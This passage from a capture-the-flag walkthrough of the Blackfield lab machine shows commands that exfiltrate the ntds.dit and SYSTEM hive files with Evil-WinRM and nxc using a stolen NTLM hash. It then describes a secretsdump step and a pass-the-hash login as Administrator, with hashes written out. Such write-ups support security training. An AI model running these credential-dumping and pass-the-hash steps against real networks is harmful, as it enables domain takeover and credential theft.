/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Info: Download successful!

*Evil-WinRM* PS C:\Windows\Temp> download system.bak /tmp/blackfield_system.bak  
   
                                          
Info: Downloading C:\Windows\Temp\system.bak to /tmp/blackfield_system.bak  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
                                          
Info: Download successful!
```

```bash
nxc smb 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d --get-file 'Windows/Temp/ntds.dit' /tmp/blackfield_ntds.dit 2>&1; nxc smb 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d --get-file 'Windows/Temp/system.bak' /tmp/blackfield_system.bak 2>&1; ls -la /tmp/blackfield_ntds.dit /tmp/blackfield_system.bak
```

We use `Impacket`'s `secretsdump` with `svc_backup`'s hash and we get the Administrator hash, we use `Pass-The-Hash` :

```bash
>  evil-winrm -i 10.129.229.17 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> type /Users/Administrator/Desktop/root.txt  
437***************955cb
```

And we got root.
